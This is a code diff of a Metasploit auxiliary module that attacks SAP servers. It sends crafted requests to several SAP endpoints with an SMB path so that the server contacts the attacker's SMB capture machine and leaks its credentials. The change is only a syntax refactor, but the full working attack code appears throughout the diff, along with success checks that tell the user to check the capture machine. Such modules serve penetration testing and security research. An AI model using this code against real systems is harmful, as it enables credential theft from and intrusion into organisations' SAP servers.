@@ -95,14 +95,18 @@ class Metasploit4 < Msf::Auxiliary
 
     begin
       print_status("#{rhost}:#{rport} - Sending request for #{smb_uri}")
-      res = send_request_raw({
-        'uri' => '/sap/bw/xml/soap/xmla?sap-client=' + datastore['CLIENT'] + '&sap-language=EN',
+      res = send_request_raw(
+        'uri' => '/sap/bw/xml/soap/xmla',
         'method' => 'POST',
         'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
         'data' => data,
         'ctype' => 'text/xml; charset=UTF-8',
-        'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT']
-      })
+        'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
+        'vars_get' => {
+          'sap-client' => datastore['CLIENT'],
+          'sap-language' => 'EN'
+        }
+      )
       if res and res.code == 200 and res.body =~ /XML for Analysis Provider/ and res.body =~ /Request transfered is not a valid XML/
         print_good("#{rhost}:#{rport} - SMB Relay looks successful, check your SMB capture machine")
       else
@@ -120,7 +124,7 @@ class Metasploit4 < Msf::Auxiliary
 
       if datastore['USERNAME'].empty?
         vprint_status("#{rhost}:#{rport} - Sending unauthenticated request for #{smb_uri}")
-        res = send_request_cgi({
+        res = send_request_cgi(
           'uri' => '/mmr/MMR',
           'method' => 'HEAD',
           'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
@@ -130,11 +134,11 @@ class Metasploit4 < Msf::Auxiliary
             'sap-language' => 'EN',
             'filename' => smb_uri
           }
-        })
+        )
 
       else
         vprint_status("#{rhost}:#{rport} - Sending authenticated request for #{smb_uri}")
-        res = send_request_cgi({
+        res = send_request_cgi(
           'uri' => '/mmr/MMR',
           'method' => 'GET',
           'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
@@ -145,7 +149,7 @@ class Metasploit4 < Msf::Auxiliary
             'sap-language' => 'EN',
             'filename' => smb_uri
           }
-        })
+        )
       end
 
       if res
@@ -165,7 +169,7 @@ class Metasploit4 < Msf::Auxiliary
 
     begin
       vprint_status("#{rhost}:#{rport} - Sending request for #{smb_uri}")
-      res = send_request_cgi({
+      res = send_request_cgi(
         'uri' => '/sap/bc/soap/rfc',
         'method' => 'POST',
         'data' => data,
@@ -179,7 +183,7 @@ class Metasploit4 < Msf::Auxiliary
           'sap-client' => datastore['CLIENT'],
           'sap-language' => 'EN'
         }
-      })
+      )
       if res and res.code == 500 and res.body =~ /OPEN_FAILURE/
         print_good("#{rhost}:#{rport} - SMB Relay looks successful, check your SMB capture machine")
       else
